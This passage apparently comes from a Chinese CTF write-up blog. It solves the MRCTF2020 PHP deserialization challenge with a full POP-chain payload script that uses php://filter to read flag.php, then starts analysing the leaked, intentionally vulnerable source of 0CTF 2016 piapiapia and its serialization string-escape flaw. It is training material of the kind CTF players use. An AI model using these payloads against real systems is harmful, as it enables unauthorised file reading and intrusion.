<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;	<span class="comment">#尝试以函数的方式调用的时候会执行</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);<span class="comment">#包含此类中的var文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;<span class="comment">#构造方法在方法的开头执行</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;<span class="comment">#当此类被当作输出变量输出时执行此函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;<span class="comment">#返回file</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">#如果有序列化执行的先进这个函数</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;<span class="comment">#如果此类的source里面含有这些词，那么就会进入if进行覆盖</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;#在类结束的时候执行</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;#调用此类中没有的类的时候执行将传入的数当成函数执行</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单梳理一下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">首先Modifier类中拥有我们最终需要的代码函数include因为他没有进行什么过滤，我们可以用伪协议读取到flag，题目提示了flag在当前目录下的flag.php中，它在append函数中，append函数在__invoke函数中被调用，该魔术方法的调用方式是该类被当作函数被调用的时候会被执行，寻找一下那个地方拥有返回调用函数，在Test类中的`__get`魔术方法中如果进入该魔术方法会将其返回值当作函数执行，而get魔术方法在官方文档中这么解释：读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用。 所以当我们调用test中不存在的属性就会被调用。哪里有不存在的属性呢，如果show类中的属性str是Test类的话，上面的__tostring访问的str的source属性就是不存在的属性就会触发__get魔术方法，那么构造出调用__tostring魔术方法，就可以完成pop链，上面的构造方法中正好存在将source属性当作echo的字符串输出的点，所以我们需要另外构造一个show类的变量，让他的source指向我们之前构造的变量来触发__tostring方法，至此pop构造完成</span><br></pre></td></tr></table></figure>

<p>简单来说就是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$变量<span class="number">1</span>（Show）-&gt;source=$变量<span class="number">2</span>(Show)-&gt;str(Test)-&gt;p(Modifier)最后给<span class="keyword">var</span>一个伪协议:php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span>-&gt;source = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">因为Modifier类中含有一个protected变量，在序列化之后含有不可见字符，所以我们需要对他进行一次url编码，让其可见</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>MRCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>piapiapia</title>
    <url>/2022/03/24/piapiapia/</url>
    <content><![CDATA[<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p>_<strong>信息收集信息收集信息收集</strong>_重要的事情说三遍！</p>
<p>从刚开始就卡了好久，以为是sql注入，用sqlmap跑了好久，然后用dirsearch也没扫出来，最后手动测，访问<a class="link" href="http://www.zip之后发现了源码泄露/">www.zip之后发现了源码泄露<i class="fas fa-external-link-alt"></i></a></p>
<p>一共有6个文件其中有两个没用，一步步来分析叭：</p>
<p>config.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到其中蕴含了flag所以我们最终能够看到flag的地方就是这里，也就是说我们需要读取到服务器上面的config.php文件。</p>
<p>register.php里面没有什么特别重要的，跳过。</p>
<p>index.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);<span class="comment">#先登录，如果已登录则转到profile.php</span></span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;<span class="comment">#检查是否设置了用户名以及密码</span></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) <span class="comment">#检测用户名长度</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) <span class="comment">#检测用户密码长度</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;<span class="comment">#如果已经登录了，进入下面</span></span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;<span class="comment">#设置username</span></span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);<span class="comment">#转到</span></span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);<span class="comment">#退出</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看来里面也没有什么可以利用的地方</p>
<p>跟进一下profile.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;<span class="comment">#检测是否登录</span></span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];<span class="comment">#将之前的用户名拿过来</span></span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));<span class="comment">#这里基本是我们需要用到的拿到需要拿到config.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到这个文件里面有我们需要用到的file_get_contest也就是最终我们需要利用的地方</p>
<p>如果他是空会跳转到update.php继续跟进：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;<span class="comment">#检测登录</span></span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;<span class="comment">#如果这些都已经上传则进入判断</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];<span class="comment">#拿到更行之后的名称</span></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))<span class="comment">#对电话进行判断，必须是11个纯数字</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))<span class="comment">#对邮箱的格式进行确认</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)<span class="comment">#对nickname格式进行判断，长度需要小于10而且别绪没有字母数字下划线，这里的过滤不严格，可以用数组进行过滤，数组的话会被判定为false（0）</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)<span class="comment">#对图片的大小进行设置</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));<span class="comment">#将文件移动到上传目录下，文件名MD5之后存储</span></span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];					<span class="comment">#直接将判断之后的这些数据上传到服务器</span></span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));<span class="comment">#对我们的上传数据进行序列化保存，现在就需要序列化构造字符串逃逸</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中这里有个序列化，我们可以利用这里来将里面的photo变成config，而且上面别的地方都没办法使用，那么能够利用的地方也就是nickname这个属性了，先继续跟进class.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="keyword">Array</span>(<span class="variable">$username</span>, md5(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === md5(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;<span class="comment">#更新文件</span></span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);<span class="comment">#调用filter静态方法</span></span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);<span class="comment">#调用filter静态方法</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;<span class="comment">#/ &#x27; | \\ /</span></span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);<span class="comment">#在string中将‘还有\\替换成下划线</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;<span class="comment">#上面的数组用|隔开</span></span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);<span class="comment">#如果含有以上数组中的值，将其替换为hacker（可以看到别的都是6个字符但是where只有5个字符，如果它替换成hacker那么就会自增字符）</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> user();</span><br><span class="line"><span class="variable">$user</span>-&gt;connect(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure>

<p>该网页中主要的函数就是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;<span class="comment">#更新文件</span></span><br><span class="line">	<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);<span class="comment">#调用filter静态方法</span></span><br><span class="line">	<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);<span class="comment">#调用filter静态方法</span></span><br><span class="line"></span><br><span class="line">	<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进一下filter方法：</p>
